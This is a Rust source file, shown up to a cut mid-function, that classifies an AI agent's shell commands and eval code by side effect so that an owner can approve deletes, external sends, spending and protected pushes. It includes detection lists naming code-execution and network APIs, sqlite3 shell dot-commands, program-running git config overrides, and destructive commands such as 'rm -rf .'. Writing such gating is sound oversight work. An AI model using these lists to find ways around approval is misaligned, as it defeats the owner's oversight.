use std::fmt;
use std::path::Path;
use std::str::FromStr;

use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Effect {
    Read,
    Draft,
    WriteLocal,
    VcsLocal,
    VcsRemote,
    VcsProtected,
    ExternalSend,
    Delete,
    Spend,
    Unknown,
}

impl Effect {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Read => "read",
            Self::Draft => "draft",
            Self::WriteLocal => "write_local",
            Self::VcsLocal => "vcs_local",
            Self::VcsRemote => "vcs_remote",
            Self::VcsProtected => "vcs_protected",
            Self::ExternalSend => "external_send",
            Self::Delete => "delete",
            Self::Spend => "spend",
            Self::Unknown => "unknown",
        }
    }

    pub fn allows_any_precedent(&self) -> bool {
        !matches!(self, Self::Spend)
    }

    pub fn allows_class_precedent(&self) -> bool {
        !matches!(self, Self::Spend | Self::Delete | Self::VcsProtected)
    }
}

impl fmt::Display for Effect {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl FromStr for Effect {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.trim() {
            "read" => Ok(Self::Read),
            "draft" => Ok(Self::Draft),
            "write_local" => Ok(Self::WriteLocal),
            "vcs_local" => Ok(Self::VcsLocal),
            "vcs_remote" => Ok(Self::VcsRemote),
            "vcs_protected" => Ok(Self::VcsProtected),
            "external_send" => Ok(Self::ExternalSend),
            "delete" => Ok(Self::Delete),
            "spend" => Ok(Self::Spend),
            "unknown" => Ok(Self::Unknown),
            other => Err(format!("unknown effect: {other}")),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Classification {
    pub effect: Effect,
    pub program: String,
    pub target: String,
    pub signature: String,
    pub summary: String,
}

impl Classification {
    pub fn new(
        effect: Effect,
        program: impl Into<String>,
        target: impl Into<String>,
        summary: impl Into<String>,
    ) -> Self {
        let program = program.into();
        let target = normalize_target(&target.into());
        let summary = summary.into();
        let mut signature = format!("{}:{}:{}", effect.as_str(), program, target);
        // An exact precedent for a destructive, outward or unreadable action covers only the
        // exact command the owner saw (rm -rf ., push --force, another PR, `python3 -c ..` are
        // different cases).
        if signature_carries_command(effect) {
            push_exact_command(&mut signature, &summary);
        }
        Self {
            effect,
            program,
            target,
            signature,
            summary,
        }
    }
}

fn signature_carries_command(effect: Effect) -> bool {
    matches!(
        effect,
        Effect::Delete | Effect::VcsProtected | Effect::ExternalSend | Effect::Unknown
    )
}

fn push_exact_command(signature: &mut String, command: &str) {
    let exact = command.split_whitespace().collect::<Vec<_>>().join(" ");
    if !exact.is_empty() {
        signature.push('|');
        signature.push_str(&exact);
    }
}

fn code_hash(code: &str) -> u64 {
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    code.hash(&mut h);
    h.finish()
}

/// Fixed owner rules:
/// - `spend` always asks and never gets a precedent.
/// - `tainted` + (`external_send` | `delete` | `spend` | `vcs_protected`) always asks
///   (except `external_send` when matched by an exact recipient precedent in the ledger).
pub fn requires_always_ask(effect: Effect, tainted: bool) -> bool {
    if effect == Effect::Spend {
        return true;
    }
    tainted
        && matches!(
            effect,
            Effect::ExternalSend | Effect::Delete | Effect::Spend | Effect::VcsProtected
        )
}

/// True when an engine approval frame is the outer `Tool: eval` container request
/// (`command == null`, `reason` starts with `"Tool: eval"` or `itemId == "approval-eval"`).
impl Effect {
    /// Higher means more consequential; used to pick the effect that decides an eval cell.
    pub fn rank(&self) -> u8 {
        match self {
            Self::Read => 0,
            Self::Draft => 1,
            Self::WriteLocal => 2,
            Self::VcsLocal => 3,
            Self::VcsRemote => 4,
            Self::Unknown => 5,
            Self::ExternalSend => 6,
            Self::Delete => 7,
            Self::VcsProtected => 8,
            Self::Spend => 9,
        }
    }
}

/// Shell commands an eval cell runs through Bun's template-literal shell, or a `command:` string.
/// A bare eval approval frame carries no command, and a command run through Bun's shell raises no
/// nested frame, so the cell's own code is the only place to see it.
pub fn eval_shell_commands(code: &str) -> Vec<String> {
    let mut out = Vec::new();
    let bytes = code.as_bytes();
    let mut i = 0;
    while i + 1 < bytes.len() {
        if bytes[i] == b'$' && bytes[i + 1] == b'`' {
            let start = i + 2;
            let mut j = start;
            while j < bytes.len() && !(bytes[j] == b'`' && bytes[j - 1] != b'\\') {
                j += 1;
            }
            out.push(code[start..j.min(bytes.len())].to_string());
            i = j + 1;
            continue;
        }
        i += 1;
    }
    let mut rest = code;
    while let Some(pos) = rest.find("command") {
        let after = rest[pos + "command".len()..].trim_start();
        let value = after
            .strip_prefix(':')
            .or_else(|| after.strip_prefix('='))
            .map(str::trim_start);
        if let Some(value) = value {
            if let Some(quote) = value.chars().next().filter(|c| matches!(c, '"' | '\'')) {
                if let Some(end) = value[1..].find(quote) {
                    out.push(value[1..1 + end].to_string());
                }
            }
        }
        rest = &rest[pos + "command".len()..];
    }
    out.retain(|c| !c.trim().is_empty());
    out
}

/// The most consequential side-effecting shell command in an eval cell, or None when it runs
/// only reads or no shell command at all.
pub fn classify_eval_code(code: &str, cwd: Option<&str>) -> Option<Classification> {
    let mut best: Option<Classification> = None;
    let mut consider = |c: Classification| {
        if c.effect != Effect::Read
            && best
                .as_ref()
                .is_none_or(|b| c.effect.rank() > b.effect.rank())
        {
            best = Some(c);
        }
    };
    for cmd in eval_shell_commands(code) {
        // A command built from variables cannot be read from the cell's text.
        if cmd.contains("${") {
            consider(eval_unknown(code, cwd, "interpolated shell command"));
            continue;
        }
        consider(classify_command(&cmd, cwd));
    }
    for path in eval_written_paths(code) {
        consider(classify_file_change(&path, cwd));
    }
    if let Some(api) = eval_opaque_api(code) {
        consider(eval_unknown(code, cwd, api));
    }
    // Bind every classified cell to its full code, including additional read commands and
    // multiple opaque API calls that are represented by a single classification.
    stamp_signature(&mut best, code);
    best
}

/// Appends the cell hash so a precedent covers this exact cell only.
fn stamp_signature(best: &mut Option<Classification>, code: &str) {
    let Some(b) = best.as_mut() else {
        return;
    };
    let hash = format!("|{:016x}", code_hash(code));
    if !b.signature.ends_with(&hash) {
        b.signature.push_str(&hash);
    }
}

/// A side effect the classifier cannot read from the cell text. The signature carries a hash of
/// the code, so a precedent never covers a different cell.
fn eval_unknown(code: &str, cwd: Option<&str>, why: &str) -> Classification {
    let mut c = Classification::new(
        Effect::Unknown,
        "eval",
        resolve_target_scope(None, cwd),
        format!("eval ({why})"),
    );
    c.signature = format!("{}|{:016x}", c.signature, code_hash(code));
    c
}

/// JS calls in an eval cell that act outside the shell and the file helpers.
fn eval_opaque_api(code: &str) -> Option<&'static str> {
    const APIS: &[(&str, &str)] = &[
        ("Bun.spawn", "Bun.spawn"),
        ("child_process", "child_process"),
        ("execSync", "exec"),
        ("spawnSync", "spawn"),
        ("fetch(", "fetch"),
        ("rmSync", "fs delete"),
        ("unlink", "fs delete"),
        ("rmdir", "fs delete"),
        ("rename(", "fs rename"),
        ("renameSync", "fs rename"),
        ("copyFile", "fs copy"),
        ("cpSync", "fs copy"),
        ("truncate", "fs truncate"),
        ("createWriteStream", "fs write"),
        ("openSync", "fs open"),
        ("writeSync", "fs write"),
        ("writev", "fs write"),
        ("mkdir", "fs mkdir"),
        ("symlink", "fs link"),
        ("chmod", "fs chmod"),
        ("utimes", "fs touch"),
        ("WebSocket", "socket"),
        ("Bun.serve", "server"),
        ("agent(", "subagent"),
        ("tool.bash", "tool.bash"),
        ("tool.task", "tool.task"),
        ("import(", "dynamic import"),
        ("require(", "require"),
    ];
    // Shell commands passed to tool.bash as literals are classified on their own.
    let mut stripped = code
        .replace("tool.bash({ command:", "")
        .replace("tool.bash({command:", "");
    // Shell command text is classified on its own; `mkdir` inside it is not a JS fs call.
    for cmd in eval_shell_commands(code) {
        for literal in [
            format!("$`{cmd}`"),
            format!("\"{cmd}\""),
            format!("'{cmd}'"),
        ] {
            stripped = stripped.replace(&literal, "");
        }
    }
    // `Bun.file(p).delete()` (or a handle kept in a variable); a bare `map.delete(k)` is not fs.
    if stripped.contains(").delete(")
        || (stripped.contains("Bun.file") && stripped.contains(".delete("))
    {
        return Some("fs delete");
    }
    // `rm(` / `cp(` only as their own identifier, so `transform(` or `confirm(` stay reads.
    for (needle, why) in [("rm(", "fs delete"), ("cp(", "fs copy")] {
        let mut from = 0;
        while let Some(pos) = stripped[from..].find(needle) {
            let at = from + pos;
            let prev = stripped[..at].chars().next_back();
            if !prev.is_some_and(|c| c.is_alphanumeric() || c == '_' || c == '$') {
                return Some(why);
            }
            from = at + needle.len();
        }
    }
    APIS.iter()
        .find(|(needle, _)| stripped.contains(needle))
        .map(|(_, why)| *why)
}

/// Literal paths an eval cell writes through `write(..)`, `Bun.write(..)` or `fs.writeFile*`.
fn eval_written_paths(code: &str) -> Vec<String> {
    let mut out = Vec::new();
    for call in [
        "write(",
        "writeFile(",
        "writeFileSync(",
        "appendFile(",
        "appendFileSync(",
    ] {
        let mut rest = code;
        while let Some(pos) = rest.find(call) {
            let after = rest[pos + call.len()..].trim_start();
            let quote = after.chars().next();
            let path = match quote {
                Some(q @ ('"' | '\'' | '`')) => {
                    after[1..].find(q).map(|end| after[1..1 + end].to_string())
                }
                _ => None,
            };
            // A path built from variables cannot be read; treat it as an unknown write.
            out.push(match path {
                Some(p) if !p.contains("${") => p,
                _ => "unknown".to_string(),
            });
            rest = &rest[pos + call.len()..];
        }
    }
    out
}

pub fn is_bare_eval_frame(frame: &Value) -> bool {
    let method = frame
        .get("method")
        .and_then(Value::as_str)
        .unwrap_or("item/commandExecution/requestApproval");
    if !method.contains("commandExecution") {
        return false;
    }
    let params = frame.get("params").unwrap_or(frame);
    let command = params
        .get("command")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty());
    if command.is_some() {
        return false;
    }
    let item_id = params.get("itemId").and_then(Value::as_str).unwrap_or("");
    let reason = params.get("reason").and_then(Value::as_str).unwrap_or("");
    item_id == "approval-eval" || reason.trim_start().starts_with("Tool: eval")
}

pub fn classify_json(val: &Value) -> Classification {
    let default_cwd = val.get("location").and_then(Value::as_str);
    if let Some(frames) = val.get("frames").and_then(Value::as_array) {
        for frame in frames {
            let method = frame.get("method").and_then(Value::as_str).unwrap_or("");
            let params = frame.get("params").unwrap_or(frame);
            let has_cmd = params
                .get("command")
                .and_then(Value::as_str)
                .is_some_and(|s| !s.trim().is_empty());
            if has_cmd || method == "item/fileChange/requestApproval" {
                return classify_frame(frame, default_cwd);
            }
        }
        if let Some(prompt) = val.get("prompt").and_then(Value::as_str) {
            const PREFIX: &str =
                "Run exactly this shell command with the bash tool and nothing else:";
            if let Some(rest) = prompt.strip_prefix(PREFIX) {
                let cmd = rest.trim();
                if !cmd.is_empty() {
                    return classify_command(cmd, default_cwd);
                }
            }
        }
        if let Some(first) = frames.first() {
            return classify_frame(first, default_cwd);
        }
    }
    classify_frame(val, default_cwd)
}

pub fn classify_frame(frame: &Value, default_cwd: Option<&str>) -> Classification {
    let method = frame
        .get("method")
        .and_then(Value::as_str)
        .unwrap_or_default();
    let params = frame.get("params").unwrap_or(frame);
    let cwd = params
        .get("cwd")
        .and_then(Value::as_str)
        .filter(|s| !s.trim().is_empty())
        .or(default_cwd);
    let reason = params
        .get("reason")
        .and_then(Value::as_str)
        .unwrap_or_default();

    if method == "item/fileChange/requestApproval" || reason.trim_start().starts_with("File:") {
        let path = extract_prefixed_line(reason, "File:")
            .or_else(|| params.get("grantRoot").and_then(Value::as_str))
            .unwrap_or("unknown");
        return classify_file_change(path, cwd);
    }

    if let Some(cmd) = params
        .get("command")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        return classify_command(cmd, cwd);
    }

    if let Some(cmd_line) = extract_prefixed_line(reason, "Command:") {
        let cleaned = cmd_line.trim_start_matches('$').trim();
        if !cleaned.is_empty() {
            return classify_command(cleaned, cwd);
        }
    }

    if let Some(dir) = extract_prefixed_line(reason, "Directory:") {
        let effect = if is_draft_path(dir, cwd) {
            Effect::Draft
        } else {
            Effect::Unknown
        };
        return Classification::new(
            effect,
            "directory",
            resolve_target_scope(Some(dir), cwd),
            format!("directory access {dir}"),
        );
    }

    if is_bare_eval_frame(frame) {
        return Classification::new(
            Effect::Unknown,
            "eval",
            resolve_target_scope(None, cwd),
            "Tool: eval",
        );
    }

    Classification::new(
        Effect::Unknown,
        "unknown",
        resolve_target_scope(None, cwd),
        if reason.is_empty() {
            "unknown approval request".to_string()
        } else {
            reason.lines().next().unwrap_or("unknown").to_string()
        },
    )
}

pub fn classify_file_change(path: &str, cwd: Option<&str>) -> Classification {
    let trimmed = path.trim();
    let effect = if is_draft_path(trimmed, cwd) {
        Effect::Draft
    } else {
        Effect::WriteLocal
    };
    let target = resolve_file_target(trimmed, cwd);
    Classification::new(effect, "edit", target, format!("edit {trimmed}"))
}

pub fn classify_argv(argv: &[String], cwd: Option<&str>) -> Classification {
    if argv.is_empty() {
        return Classification::new(Effect::Unknown, "empty", "", "empty argv");
    }
    let prog = basename(&argv[0]);
    if matches!(prog, "sh" | "bash" | "zsh" | "fish" | "dash" | "eval") {
        return Classification::new(
            Effect::Unknown,
            prog,
            resolve_target_scope(None, cwd),
            argv.join(" "),
        );
    }
    let joined = shell_join(argv);
    classify_tokens(argv, cwd, &joined)
}

pub fn classify_command(command: &str, cwd: Option<&str>) -> Classification {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Classification::new(Effect::Unknown, "empty", "", "empty command");
    }
    // Command and process substitution run arbitrary code the tokenizer cannot see.
    if has_unquoted_substitution(trimmed) {
        return Classification::new(
            Effect::Unknown,
            "shell",
            resolve_target_scope(None, cwd),
            trimmed.to_string(),
        );
    }
    let segments = split_shell_segments(trimmed);
    if segments.len() > 1 {
        // Every segment runs, so the most consequential one decides; `cd` carries forward.
        let mut seg_cwd = cwd.map(str::to_string);
        let mut worst: Option<Classification> = None;
        for seg in &segments {
            let (next_cwd, body) = peel_cd_prefix(seg, seg_cwd.as_deref());
            if body.is_empty() || body == "cd" || body.starts_with("cd ") {
                if let Some(dir) = body.strip_prefix("cd ") {
                    let dir = dir.trim().trim_matches('"').trim_matches('\'');
                    seg_cwd = Some(join_cwd(seg_cwd.as_deref(), dir));
                }
                continue;
            }
            let c = classify_command(body, next_cwd.as_deref());
            if worst
                .as_ref()
                .is_none_or(|w| c.effect.rank() > w.effect.rank())
            {
                worst = Some(c);
            }
        }
        return match worst {
            Some(mut c) => {
                c.summary = trimmed.to_string();
                // The precedent must cover every segment, not just the one that decided.
                if signature_carries_command(c.effect) {
                    c.signature = format!("{}:{}:{}", c.effect.as_str(), c.program, c.target);
                    push_exact_command(&mut c.signature, trimmed);
                } else {
                    c.signature = format!("{}|{:016x}", c.signature, code_hash(trimmed));
                }
                c
            }
            None => Classification::new(Effect::Read, "cd", "", trimmed.to_string()),
        };
    }

    let (effective_cwd, body) = peel_cd_prefix(trimmed, cwd);
    let cwd_ref = effective_cwd.as_deref();

    if let Some(redir_target) = detect_output_redirection(body) {
        let effect = if is_draft_path(&redir_target, cwd_ref) {
            Effect::Draft
        } else {
            Effect::WriteLocal
        };
        let target = resolve_file_target(&redir_target, cwd_ref);
        return Classification::new(effect, "redirect", target, trimmed.to_string());
    }

    let tokens = tokenize_shell(body);
    let tokens = skip_env_assignments(&tokens);
    if tokens.is_empty() {
        return Classification::new(Effect::Unknown, "empty", "", trimmed.to_string());
    }

    let prog0 = basename(&tokens[0]);
    if matches!(prog0, "sh" | "bash" | "zsh") && tokens.len() >= 3 && tokens[1] == "-c" {
        return classify_command(&tokens[2], cwd_ref);
    }

    classify_tokens(tokens, cwd_ref, trimmed)
}

fn classify_tokens(tokens: &[String], cwd: Option<&str>, summary: &str) -> Classification {
    if tokens.is_empty() {
        return Classification::new(Effect::Unknown, "empty", "", summary);
    }
    let prog = basename(&tokens[0]);
    let args = &tokens[1..];

    if is_spend_invocation(prog, args) {
        let target = resolve_target_scope(None, cwd);
        return Classification::new(Effect::Spend, format!("{prog} spend"), target, summary);
    }

    match prog {
        "git" => classify_git(args, cwd, summary),
        "gh" => classify_gh(args, cwd, summary),
        "rm" | "rmdir" | "unlink" | "trash" => {
            let (_, positionals) = split_flags_and_positionals(args, &[]);
            let path = positionals.first().map(String::as_str);
            let target = resolve_target_scope(path, cwd);
            Classification::new(Effect::Delete, prog, target, summary)
        }
        "find" => {
            let has_delete = args
                .iter()
                .any(|a| a == "-delete" || a == "rm" || a.starts_with("-exec"));
            let (_, positionals) = split_flags_and_positionals(
                args,
                &["-name", "-path", "-type", "-maxdepth", "-mindepth"],
            );
            let path = positionals.first().map(String::as_str);
            let target = resolve_target_scope(path, cwd);
            if has_delete {
                Classification::new(Effect::Delete, "find -delete", target, summary)
            } else {
                Classification::new(Effect::Read, "find", target, summary)
            }
        }
        "ls" | "pwd" | "cat" | "head" | "tail" | "wc" | "stat" | "file" | "du" | "df" | "which"
        | "type" | "uname" | "date" | "whoami" | "id" | "printenv" | "jq" | "true" | "false"
        | "echo" | "printf" => {
            let (_, positionals) = split_flags_and_positionals(args, &[]);
            let path = positionals
                .iter()
                .find(|p| p.starts_with('/') || p.starts_with('~') || p.starts_with('.'))
                .map(String::as_str);
            let target = resolve_target_scope(path, cwd);
            Classification::new(Effect::Read, prog, target, summary)
        }
        "rg" | "grep" | "egrep" | "fgrep" => {
            // `rg --pre <cmd>` runs a program per file.
            if args.iter().any(|a| a == "--pre" || a.starts_with("--pre=")) {
                return Classification::new(
                    Effect::Unknown,
                    format!("{prog} --pre"),
                    resolve_target_scope(None, cwd),
                    summary,
                );
            }
            let (_, positionals) = split_flags_and_positionals(
                args,
                &[
                    "-e",
                    "-f",
                    "-g",
                    "--glob",
                    "-t",
                    "--type",
                    "-A",
                    "-B",
                    "-C",
                    "-m",
                    "--max-count",
                ],
            );
            let path = if positionals.len() >= 2 {
                positionals.last().map(String::as_str)
            } else {
                None
            };
            let target = resolve_target_scope(path, cwd);
            Classification::new(Effect::Read, prog, target, summary)
        }
        "sqlite3" => {
            let has_cmd = args.iter().any(|a| {
                matches!(a.as_str(), "-cmd" | "--cmd" | "-init" | "--init")
                    || a.starts_with("-cmd=")
                    || a.starts_with("--cmd=")
                    || a.starts_with("-init=")
                    || a.starts_with("--init=")
            });
            let (_, positionals) = split_flags_and_positionals(
                args,
                &["-cmd", "-separator", "-init", "-nullvalue", "-vfs"],
            );
            let db_path = positionals.first().map(String::as_str);
            let sql = positionals
                .get(1)
                .map(|s| s.to_ascii_lowercase())
                .unwrap_or_default();
            let target = resolve_target_scope(db_path, cwd);
            // Dot-commands and SQL functions that run programs or write files are not reads.
            let dangerous = [
                ".shell",
                ".system",
                ".output",
                ".once",
                ".import",
                ".backup",
                ".restore",
                "writefile",
                "load_extension",
                "attach ",
                "vacuum",
            ]
            .iter()
            .any(|needle| sql.contains(needle));
            // `-cmd`, extra statements and dot-commands cannot be read from the one SELECT text;
            // `-readonly` does not make them safe.
            if has_cmd || positionals.len() > 2 || dangerous {
                return Classification::new(Effect::Unknown, "sqlite3", target, summary);
            }
            // Read-only database mode does not constrain shell commands or PRAGMA side effects.
            // Every statement must be an actual SELECT, not just start with that substring.
            let statements: Vec<&str> = sql
                .split(';')
                .map(str::trim)
                .filter(|statement| !statement.is_empty())
                .collect();
            if !statements.is_empty()
                && statements.iter().all(|statement| {
                    statement.strip_prefix("select").is_some_and(|rest| {
                        rest.starts_with(|c: char| c.is_whitespace() || c == '(')
                    })
                })
            {
                Classification::new(Effect::Read, "sqlite3", target, summary)
            } else if is_draft_path(db_path.unwrap_or(""), cwd) {
                Classification::new(Effect::Draft, "sqlite3", target, summary)
            } else {
                Classification::new(Effect::WriteLocal, "sqlite3", target, summary)
            }
        }
        "touch" | "mkdir" | "cp" | "mv" | "chmod" | "chown" | "truncate" | "tee" => {
            let (_, positionals) = split_flags_and_positionals(args, &["-m", "-o", "-g"]);
            let dst = positionals.last().map(String::as_str).unwrap_or("");
            let effect = if is_draft_path(dst, cwd) {
                Effect::Draft
            } else {
                Effect::WriteLocal
            };
            let target = resolve_file_target(dst, cwd);
            Classification::new(effect, prog, target, summary)
        }
        "sed" => {
            // `-i`, `-Ei`, `-i.bak` and `--in-place[=SUF]` all rewrite the file in place.
            let in_place = args.iter().any(|a| {
                a.starts_with("--in-place")
                    || (a.starts_with('-') && !a.starts_with("--") && a[1..].contains('i'))
            });
            // A script file cannot be read from the arguments.
            let script_file = args.iter().any(|a| {
                a == "--file"
                    || a.starts_with("--file=")
                    || (a.starts_with("-f") && !a.starts_with("--"))
            });
            let (_, positionals) = split_flags_and_positionals(args, &["-e", "-f"]);
            let file = positionals.last().map(String::as_str).unwrap_or("");
            // The `w`/`W` command and the `s///w` flag write a file even without `-i`.
            let writes = sed_scripts(args, &positionals)
                .iter()
                .any(|script| sed_script_writes_file(script));
            if script_file {
                Classification::new(
                    Effect::Unknown,
                    "sed -f",
                    resolve_target_scope(Some(file), cwd),
                    summary,
                )
            } else if in_place || writes {
                let effect = if is_draft_path(file, cwd) {
                    Effect::Draft
                } else {
                    Effect::WriteLocal
                };
                let program = if in_place { "sed -i" } else { "sed w" };
                Classification::new(effect, program, resolve_file_target(file, cwd), summary)
            } else {
                Classification::new(
                    Effect::Read,
                    "sed",
                    resolve_target_scope(Some(file), cwd),
                    summary,
                )
            }
        }
        "imsg" | "slack-cli" | "sendmail" | "mail" | "mailx" => {
            let recipient = extract_recipient(args).unwrap_or_else(|| "external".to_string());
            Classification::new(Effect::ExternalSend, prog, recipient, summary)
        }
        "zele" => {
            let sends = args
                .iter()
                .any(|a| matches!(a.as_str(), "send" | "reply" | "forward"));
            if sends {
                let recipient = extract_recipient(args).unwrap_or_else(|| "mail".to_string());
                Classification::new(Effect::ExternalSend, "zele mail send", recipient, summary)
            } else {
                Classification::new(
                    Effect::Read,
                    "zele",
                    resolve_target_scope(None, cwd),
                    summary,
                )
            }
        }
        "cargo" => {
            let sub = args
                .iter()
                .find(|a| !a.starts_with('-'))
                .map(String::as_str)
                .unwrap_or("");
            let target = resolve_target_scope(None, cwd);
            match sub {
                // These run build scripts and test code, so they are not reads.
                "check" | "clippy" | "test" | "bench" => {
                    Classification::new(Effect::WriteLocal, format!("cargo {sub}"), target, summary)
                }
                "doc" | "metadata" | "tree" | "version" => Classification::new(
                    Effect::Read,
                    format!("cargo {sub}").trim().to_string(),
                    target,
                    summary,
                ),
                "fmt" | "fix" | "build" | "add" | "remove" | "update" => {
                    Classification::new(Effect::WriteLocal, format!("cargo {sub}"), target, summary)
                }
                "publish" => {
                    Classification::new(Effect::VcsProtected, "cargo publish", target, summary)
                }
                _ => Classification::new(Effect::Unknown, "cargo", target, summary),
            }
        }
        // A package-script runner executes whatever the project script says, so it cannot be
        // read from the command line: it asks, and its precedent carries the exact command.
        "npm" | "bun" | "pnpm" | "yarn" | "make" => {
            let sub = args
                .iter()
                .find(|a| !a.starts_with('-'))
                .map(String::as_str)
                .unwrap_or("");
            if matches!(
                sub,
                "test" | "run" | "install" | "ci" | "start" | "build" | "deploy" | ""
            ) || prog == "make"
            {
                Classification::new(
                    Effect::Unknown,
                    format!("{prog} {sub}").trim().to_string(),
                    resolve_target_scope(None, cwd),
                    summary,
                )
            } else {
                Classification::new(Effect::Read, prog, resolve_target_scope(None, cwd), summary)
            }
        }
        _ => Classification::new(
            Effect::Unknown,
            prog,
            resolve_target_scope(None, cwd),
            summary,
        ),
    }
}

/// A refspec that lands on a protected branch, forces the remote, or deletes it.
fn push_refspec_is_protected(refspec: &str) -> bool {
    let refspec = refspec.trim();
    // `+branch` forces the update; `:branch` deletes the remote branch.
    if refspec.starts_with('+') || refspec.starts_with(':') {
        return true;
    }
    let dst = refspec.rsplit(':').next().unwrap_or(refspec);
    let name = dst.strip_prefix("refs/heads/").unwrap_or(dst);
    matches!(name, "main" | "master" | "production" | "prod" | "release")
        || name.starts_with("refs/heads/main")
}

/// The sed program text: every `-e`/`--expression` value, else the first positional.
fn sed_scripts(args: &[String], positionals: &[String]) -> Vec<String> {
    let mut scripts = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg == "-e" || arg == "--expression" {
            if let Some(value) = args.get(i + 1) {
                scripts.push(value.clone());
            }
            i += 2;
            continue;
        }
        if let Some(value) = arg
            .strip_prefix("--expression=")
            .or_else(|| arg.strip_prefix("-e").filter(|value| !value.is_empty()))
        {
            scripts.push(value.strip_prefix('=').unwrap_or(value).to_string());
        }
        i += 1;
    }
    if scripts.is_empty() {
        if let Some(first) = positionals.first() {
            scripts.push(first.clone());
        }
    }
    scripts
}

/// A sed script that writes a file: the `w`/`W` command or the `s///w` flag.
fn sed_script_writes_file(script: &str) -> bool {
    for part in script.split([';', '\n', '}']) {
        let cmd = strip_sed_addresses(part.trim_start());
        if cmd.starts_with('w') || cmd.starts_with('W') {
            return true;
        }
        if cmd.starts_with('s') && sed_subst_has_w_flag(cmd) {
            return true;
        }
    }
    false
}

/// Drops up to two leading sed addresses (`2`, `$`, `/re/`) and the range comma between them.
fn strip_sed_addresses(mut rest: &str) -> &str {
    for _ in 0..2 {
        let trimmed = rest.trim_start();
        let after = if let Some(after) = trimmed.strip_prefix('$') {
            after
        } else if trimmed.starts_with(|c: char| c.is_ascii_digit()) {
            trimmed.trim_start_matches(|c: char| c.is_ascii_digit())
        } else if let Some(after) = trimmed.strip_prefix('/') {
            match after.find('/') {
                Some(end) => &after[end + 1..],
                None => return trimmed,
            }
        } else {
            return trimmed;
        };
        rest = after.strip_prefix(',').unwrap_or(after);
        if !rest
            .trim_start()
            .starts_with(|c: char| c.is_ascii_digit() || c == '$' || c == '/')
        {
            return rest.trim_start();
        }
    }
    rest.trim_start()
}

/// `s/re/repl/flags`: true when the flags contain the file-writing `w` flag.
fn sed_subst_has_w_flag(cmd: &str) -> bool {
    let chars: Vec<char> = cmd.chars().collect();
    if chars.first() != Some(&'s') || chars.len() < 3 {
        return false;
    }
    let delim = chars[1];
    let mut seen = 0;
    let mut i = 2;
    while i < chars.len() {
        if chars[i] == '\\' {
            i += 2;
            continue;
        }
        if chars[i] == delim {
            seen += 1;
            if seen == 2 {
                let mut j = i + 1;
                let mut flags = String::new();
                while j < chars.len() && chars[j] != delim {
                    flags.push(chars[j]);
                    j += 1;
                }
                return flags.contains('w') || flags.contains('W');
            }
        }
        i += 1;
    }
    false
}

fn classify_git(args: &[String], cwd: Option<&str>, summary: &str) -> Classification {
    let mut idx = 0;
    let mut repo_cwd: Option<String> = cwd.map(str::to_string);
    while idx < args.len() {
        let tok = args[idx].as_str();
        // A config override can run arbitrary programs (core.fsmonitor, alias.*, core.pager).
        if tok == "-c"
            || tok == "--config-env"
            || tok.starts_with("--config-env=")
            || tok == "--exec-path"
        {
            return Classification::new(
                Effect::Unknown,
                "git -c",
                resolve_target_scope(None, repo_cwd.as_deref()),
                summary,
            );
        }
        if tok == "-C" || tok == "--git-dir" || tok == "--work-tree" {
            if tok == "-C" {
                if let Some(dir) = args.get(idx + 1) {
                    repo_cwd = Some(dir.clone());
                }
            }
            idx += 2;
            continue;
        }
        if let Some(dir) = tok.strip_prefix("-C") {
            if !dir.is_empty() {
                repo_cwd = Some(dir.to_string());
            }
            idx += 1;
            continue;
        }
        if tok.starts_with('-') {
            idx += 1;
            continue;
        }
        break;
    }

    let sub = args.get(idx).map(String::as_str).unwrap_or("");
    let sub_args = if idx < args.len() {
        &args[idx + 1..]
    } else {
        &[]
    };
    let repo_target = resolve_target_scope(None, repo_cwd.as_deref());

    match sub {
        "status" | "diff" | "log" | "show" | "rev-parse" | "ls-files" | "ls-remote"
        | "cat-file" | "describe" | "shortlog" | "blame" | "reflog" | "grep" => {
            // `--output` truncates a file, `-O`/`--open-files-in-pager`/`--ext-diff` run a program.
            if sub_args
                .iter()
                .any(|a| a == "--output" || a.starts_with("--output="))
            {
                let file = extract_flag_value(sub_args, &["--output"]).unwrap_or_default();
                return Classification::new(
                    Effect::WriteLocal,
                    format!("git {sub} --output"),
                    resolve_file_target(&file, repo_cwd.as_deref()),
                    summary,
                );
            }
            if sub_args.iter().any(|a| {
                a.starts_with("-O") || a.starts_with("--open-files-in-pager") || a == "--ext-diff"
            }) {
                return Classification::new(
                    Effect::Unknown,
                    format!("git {sub} -O"),
                    repo_target,
                    summary,
                );
            }
            if sub == "reflog"
                && sub_args
                    .first()
                    .is_some_and(|a| matches!(a.as_str(), "expire" | "delete"))
            {
                return Classification::new(
                    Effect::VcsLocal,
                    "git reflog expire",
                    repo_target,
                    summary,
                );
            }
            Classification::new(Effect::Read, format!("git {sub}"), repo_target, summary)
        }
        "branch" => {
            let (flags, positionals) = split_flags_and_positionals(sub_args, &[]);
            let has_delete_force = flags.iter().any(|f| f == "-D" || f == "--delete");
            let is_read = positionals.is_empty()
                || flags.iter().any(|f| {
                    matches!(
                        f.as_str(),
                        "-a" | "--all"
                            | "-r"
                            | "--remotes"
                            | "-l"
                            | "--list"
                            | "--show-current"
                            | "-v"
                            | "-vv"
                    )
                });
            if has_delete_force {
                Classification::new(Effect::VcsProtected, "git branch -D", repo_target, summary)
            } else if is_read {
                Classification::new(Effect::Read, "git branch", repo_target, summary)
            } else {
                Classification::new(Effect::VcsLocal, "git branch", repo_target, summary)
            }
        }
        "worktree" => {
            let action = sub_args.first().map(String::as_str).unwrap_or("list");
            match action {
                "list" => {
                    Classification::new(Effect::Read, "git worktree list", repo_target, summary)
                }
                "remove" | "prune" => {
                    Classification::new(Effect::Delete, "git worktree remove", repo_target, summary)
                }
                _ => {
                    Classification::new(Effect::VcsLocal, "git worktree add", repo_target, summary)
                }
            }
